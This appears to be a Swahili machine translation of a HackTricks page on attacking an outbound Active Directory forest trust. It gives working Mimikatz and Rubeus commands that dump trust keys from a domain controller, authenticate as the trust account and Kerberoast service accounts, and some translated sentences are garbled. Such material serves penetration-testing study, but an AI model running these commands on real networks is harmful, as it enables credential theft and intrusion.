# External Forest Domain - Moja-Kwa-Moja (Kuelekea Nje)

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

Katika hali hii, **kikoa chako** kinaweka **imani** fulani kwa msingi kutoka **vikoa tofauti**.

## Uchunguzi

### Imani ya Kuelekea Nje
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Shambulizi la Akaunti ya Uaminifu

Kuna udhaifu wa usalama unapotokea uhusiano wa uaminifu kati ya uwanja mmoja, unaojulikana hapa kama uwanja **A**, na uwanja mwingine, unaojulikana kama uwanja **B**, ambapo uwanja **B** unapanua uaminifu wake kwa uwanja **A**. Katika mpangilio huu, akaunti maalum inaundwa katika uwanja **A** kwa ajili ya uwanja **B**, ambayo inacheza jukumu muhimu katika mchakato wa uwakilishi kati ya uwanja huo. Akaunti hii, inayohusishwa na uwanja **B**, hutumiwa kwa kusimbua tiketi za kupata huduma kwenye uwanja huo.

Jambo muhimu la kuelewa hapa ni kwamba nenosiri na hash ya akaunti hii maalum inaweza kuchukuliwa kutoka kwa Kudhibitiwa kwa Uwanja katika uwanja **A** kwa kutumia zana ya mstari wa amri. Amri ya kutekeleza hatua hii ni:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Uchimbaji huu ni wa kufanikiwa kwa sababu akaunti, iliyojulikana na **$** baada ya jina lake, ni hai na inamilikiwa na kikundi cha "Domain Users" cha kikoa **A**, hivyo kurithi ruhusa zinazohusiana na kikundi hiki. Hii inawezesha watu kujithibitisha dhidi ya kikoa **A** kwa kutumia vibali vya akaunti hii.

**Onyo:** Ni rahisi kutumia hali hii kupata msingi katika kikoa **A** kama mtumiaji, ingawa na ruhusa mdogo. Hata hivyo, ufikiaji huu ni wa kutosha kufanya uchambuzi wa kina katika kikoa **A**.

Katika hali ambapo `ext.local` ni kikoa kinachotegemewa na `root.local` ni kikoa kinachotegemewa, akaunti ya mtumiaji iliyoitwa `EXT$` itaundwa ndani ya `root.local`. Kupitia zana maalum, ni rahisi kudondosha funguo za uaminifu za Kerberos, zikifichua vibali vya `EXT$` katika `root.local`. Amri ya kufanikisha hii ni:
```bash
lsadump::trust /patch
```
Kufuatia hili, mtu anaweza kutumia ufunguo wa RC4 uliopatikana ili kujithibitisha kama `root.local\EXT$` ndani ya `root.local` kwa kutumia amri ya zana nyingine:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Hatua hii ya uwakiki inafungua uwezekano wa kuhesabu na hata kutumia huduma ndani ya `root.local`, kama vile kufanya shambulio la Kerberoast ili kuchukua siri za akaunti ya huduma kwa kutumia:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Kukusanya nenosiri la uaminifu wazi

Katika mchakato uliopita, ilikuwa kutumika hash ya uaminifu badala ya **nenosiri wazi** (ambalo pia lilikuwa **limevujishwa na mimikatz**).

Nenosiri wazi linaweza kupatikana kwa kubadilisha pato la \[ CLEAR ] kutoka mimikatz kutoka hexadecimal na kuondoa herufi tupu ' \x00 ':

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Marafiki wakati wa kuunda uhusiano wa uaminifu, nenosiri lazima litajwe na mtumiaji kwa uaminifu. Katika maonyesho haya, ufunguo ni nenosiri halisi la uaminifu na kwa hivyo linaweza kusomwa na binadamu. Kwa kuwa ufunguo unabadilika (siku 30), nenosiri wazi halitakuwa rahisi kusomwa na binadamu lakini bado linaweza kutumiwa kiufundi.

Nenosiri wazi linaweza kutumika kufanya uwakilishi wa kawaida kama akaunti ya uaminifu, mbadala wa kuomba TGT kwa kutumia funguo za siri za Kerberos za akaunti ya uaminifu. Hapa, kuuliza root.local kutoka ext.local kwa wanachama wa Domain Admins:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Marejeo

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
